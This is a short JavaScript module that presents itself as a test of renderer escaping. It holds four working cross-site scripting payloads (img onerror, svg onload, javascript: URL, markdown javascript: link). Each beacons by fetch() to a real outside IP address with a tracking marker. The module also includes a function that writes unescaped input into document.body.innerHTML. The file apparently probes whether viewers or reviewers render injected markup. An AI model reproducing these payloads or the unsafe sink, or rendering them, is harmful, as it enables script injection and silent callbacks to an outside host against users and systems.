// Marker: CRXSS1788756949
// The following identifiers intentionally contain markup-like characters so the
// renderer's escaping can be observed.
const label = '<img src=x onerror="fetch(`http://162.35.173.130:8891/xss/CRXSS1788756949-img`)">';
const svgish = '<svg onload="fetch(`http://162.35.173.130:8891/xss/CRXSS1788756949-svg`)">';
const jsurl  = "javascript:fetch('http://162.35.173.130:8891/xss/CRXSS1788756949-jsurl')";
const mdlink = "[click](javascript:fetch('http://162.35.173.130:8891/xss/CRXSS1788756949-mdlink'))";

function renderUserContent(input) {
  document.body.innerHTML = input;   // deliberate sink for the reviewer to flag
  return input;
}

module.exports = { label, svgish, jsurl, mdlink, renderUserContent };
